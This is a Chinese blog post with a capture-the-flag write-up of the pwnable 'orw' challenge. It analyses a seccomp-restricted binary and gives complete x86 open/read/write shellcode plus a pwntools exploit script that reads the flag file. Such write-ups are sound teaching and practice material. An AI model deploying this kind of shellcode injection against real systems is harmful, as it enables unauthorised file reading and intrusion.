---
title: pwnable orw
url: https://www.o2oxy.cn/4443.html
source: print("")
date: 2025-08-06
fetch_date: 2025-10-07T00:48:00.917054
---

# pwnable orw

![print("")](https://www.o2oxy.cn/wp-content/themes/JieStyle-Two/images/avatar.jpg)

### print("")

* [Home](http://www.o2oxy.cn)
* [信息安全](https://www.o2oxy.cn/category/%E5%AE%89%E5%85%A8)
* [WEB前端](https://www.o2oxy.cn/category/web%E5%89%8D%E7%AB%AF)
* [linux](https://www.o2oxy.cn/category/linux)
* [python](https://www.o2oxy.cn/category/%E6%95%B0%E6%8D%AE%E5%BA%93)
* [监控](https://www.o2oxy.cn/category/%E7%9B%91%E6%8E%A7)
* [生活](https://www.o2oxy.cn/category/%E7%94%9F%E6%B4%BB)
* [Java学习](https://www.o2oxy.cn/category/%E5%AE%89%E5%85%A8/java)
* [宝塔面板最新活动](https://www.bt.cn/huodong)
* [Author](https://www.o2oxy.cn/tags)

# pwnable orw

作者: print("")
分类: [PWN](https://www.o2oxy.cn/category/%E5%AE%89%E5%85%A8/pwn)
发布时间: 2025-08-05 23:08
阅读次数: 2,971 次

[![](https://www.o2oxy.cn/wp-content/uploads/2025/08/1.png)](https://www.o2oxy.cn/wp-content/uploads/2025/08/1.png)

就开了一个Stack  然后执行一下看看是什么功能

[![](https://www.o2oxy.cn/wp-content/uploads/2025/08/2.png)](https://www.o2oxy.cn/wp-content/uploads/2025/08/2.png)

发现是让你输入一个shellcode 然后执行

打开IDA

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

然后有一个orw\_seccomp 函数

```
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  _BYTE *v2; // [esp+8h] [ebp-80h]
  _BYTE v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

这里是调用了 Seccomp 安全功能。具体的可以参考：<https://zhuanlan.zhihu.com/p/363174561>

可以通过 seccomp-tools 来查看哪些白名单

[![](https://www.o2oxy.cn/wp-content/uploads/2025/08/3.png)](https://www.o2oxy.cn/wp-content/uploads/2025/08/3.png)

```
0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
```

这里可以调用的为open read write

那么就可以进行构造获取flag 的文件的操作了。

|  |  |  |  |  |
| --- | --- | --- | --- | --- |
| 系统调用号:eax | Name | args1:ebx | args2:ecx | args3:edx |
| 3 | sys\_read | unsigned int fd | char \*buf | size\_t count |
| 4 | sys\_write | unsigned int fd | char \*buf | size\_t count |
| 5 | sys\_open | char \_\_user \*filename | int flags | int mode |

完整的shellcode 如下

```
        /* open(file='flag', oflag=0, mode=0) */
        /* push b'flag\x00' */
        push 1
        dec byte ptr [esp]
        push 0x67616c66
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        /* call open() */
        push 5 /* 5 */
        pop eax
        int 0x80
        /* read(fd='eax', buf='esp', nbytes=100) */
        mov ebx, eax
        mov ecx, esp
        push 0x64
        pop edx
        /* call read() */
        push 3 /* 3 */
        pop eax
        int 0x80
        /* write(fd=1, buf='esp', n=100) */
        push 1
        pop ebx
        mov ecx, esp
        push 0x64
        pop edx
        /* call write() */
        push 4 /* 4 */
        pop eax
        int 0x80
```

```
from pwn import *
r =process("./orw")
context.log_level = 'debug'
elf = ELF('orw')
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'esp',100)
shellcode = asm(shellcode)
r.sendline(shellcode)
r.interactive()
```

如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作！

 打赏支持

#### 发表回复 [取消回复](/4443.html#respond)

您的邮箱地址不会被公开。 必填项已用 \* 标注

\*

\*

更多阅读

* [pwnable orw](https://www.o2oxy.cn/4443.html)
* [SQL注入之语义分析](https://www.o2oxy.cn/4414.html)
* [PHP 词法分析/语法分析](https://www.o2oxy.cn/4400.html)

* [Windows10 安装Tensorflow2.3.0-cpu 踩坑记](https://www.o2oxy.cn/2780.html "Windows10 安装Tensorflow2.3.0-cpu 踩坑记")
* [无eval 木马免杀人免杀D盾](https://www.o2oxy.cn/2716.html "无eval 木马免杀人免杀D盾")
* [密码保护：新思路多句话过D盾、安全狗、阿里云等WAF 思路延长](https://www.o2oxy.cn/2224.html "密码保护：新思路多句话过D盾、安全狗、阿里云等WAF 思路延长")
* [通过python 把图片变为字符串](https://www.o2oxy.cn/1201.html "通过python 把图片变为字符串")
* [记一次内网渗透](https://www.o2oxy.cn/2533.html "记一次内网渗透")
* [Bugku welcome to bugkuctf 引发的思考](https://www.o2oxy.cn/1877.html "Bugku welcome to bugkuctf 引发的思考")
* [词法分析 | RE 转化成 NFA Thompson 算法](https://www.o2oxy.cn/4273.html "词法分析 | RE 转化成 NFA Thompson 算法")
* [WordPress+Kindeditor 插件实现图片点击放大的效果](https://www.o2oxy.cn/1492.html "WordPress+Kindeditor 插件实现图片点击放大的效果")
* [蓝凌OA 前台SSRF+getshell](https://www.o2oxy.cn/3494.html "蓝凌OA 前台SSRF+getshell")
* [泛微OA前台GetShell 复现](https://www.o2oxy.cn/3508.html "泛微OA前台GetShell 复现")

标签云

[Apache2.4.50](https://www.o2oxy.cn/tag/apache2-4-50)
[Apache ShenYu](https://www.o2oxy.cn/tag/apache-shenyu)
[APISIX](https://www.o2oxy.cn/tag/apisix)
[APISIX Dashboard](https://www.o2oxy.cn/tag/apisix-dashboard)
[cc5](https://www.o2oxy.cn/tag/cc5)
[CNVD-2021-49104](https://www.o2oxy.cn/tag/cnvd-2021-49104)
[CNVD-2022-60632](https://www.o2oxy.cn/tag/cnvd-2022-60632)
[CobaltStrike](https://www.o2oxy.cn/tag/cobaltstrike)
[CobaltStrike xss](https://www.o2oxy.cn/tag/cobaltstrike-xss)
[CommonsCollections5](https://www.o2oxy.cn/tag/commonscollections5)
[Confluence CVE-2021-26084](https://www.o2oxy.cn/tag/confluence-cve-2021-26084)
[CVE-2017-18349](https://www.o2oxy.cn/tag/cve-2017-18349)
[CVE-2021-4034](https://www.o2oxy.cn/tag/cve-2021-4034)
[CVE-2021-37580](https://www.o2oxy.cn/tag/cve-2021-37580)
[CVE-2021-41277](https://www.o2oxy.cn/tag/cve-2021-41277)
[CVE-2021-41773](https://www.o2oxy.cn/tag/cve-2021-41773)
[cve-2021-42013](https://www.o2oxy.cn/tag/cve-2021-42013)
[CVE-2021-43798](https://www.o2oxy.cn/tag/cve-2021-43798)
[CVE-2021-44228](https://www.o2oxy.cn/tag/cve-2021-44228)
[CVE-2021-45232](https://www.o2oxy.cn/tag/cve-2021-45232)
[CVE-2021-45232 RCE](https://www.o2oxy.cn/tag/cve-2021-45232-rce)
[CVE-2022-22954](https://www.o2oxy.cn/tag/cve-2022-22954)
[CVE-2022-22965](https://www.o2oxy.cn/tag/cve-2022-22965)
[CVE-2022-39197](https://www.o2oxy.cn/tag/cve-2022-39197)
[CVE-2023-28432](https://www.o2oxy.cn/tag/cve-2023-28432)
[Django](https://www.o2oxy.cn/tag/django)
[E-Office](https://www.o2oxy.cn/tag/e-office)
[grafana](https://www.o2oxy.cn/tag/grafana)
[keytool store](https://www.o2oxy.cn/tag/keytool-store)
[log4j2](https://www.o2oxy.cn/tag/log4j2)
[MetaBase](https://www.o2oxy.cn/tag/metabase)
[ONE Access](https://www.o2oxy.cn/tag/one-access)
[python](https://www.o2oxy.cn/tag/python)
[python爬虫](https://www.o2oxy.cn/tag/python%E7%88%AC%E8%99%AB)
[socks5](https://www.o2oxy.cn/tag/socks5)
[socks5搜索](https://www.o2oxy.cn/tag/socks5%E6%90%9C%E7%B4%A2)
[store 证书转换成nginx](https://www.o2oxy.cn/tag/store-%E8%AF%81%E4%B9%A6%E8%BD%AC%E6%8D%A2%E6%88%90nginx)
[VMware Workspace ONE Access](https://www.o2oxy.cn/tag/vmware-workspace-one-access)
[ysoserial](https://www.o2oxy.cn/tag/ysoserial)
[代理池工具](https://www.o2oxy.cn/tag/%E4%BB%A3%E7%90%86%E6%B1%A0%E5%B7%A5%E5%85%B7)
[宝塔面板](https://www.o2oxy.cn/tag/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF)
[泛微](https://www.o2oxy.cn/tag/%E6%B3%9B%E5%BE%AE)
[畅捷通](https://www.o2oxy.cn/tag/%E7%95%85%E6%8D%B7%E9%80%9A)
[畅捷通漏洞](https://www.o2oxy.cn/tag/%E7%95%85%E6%8D%B7%E9%80%9A%E6%BC%8F%E6%B4%9E)
[通达OA](https://www.o2oxy.cn/tag/%E9%80%9A%E8%BE%BEoa)

×

#### 打赏支持

![print](http://www.o2oxy.cn/wp-content/uploads/2018/09/zhi.jpg)![print微信钱包](http://www.o2oxy.cn/wp-content/uploads/2018/09/wei.jpg)

扫描二维码，输入您要打赏的金额

2017-2099 **print("")**

赣ICP备16012687号-2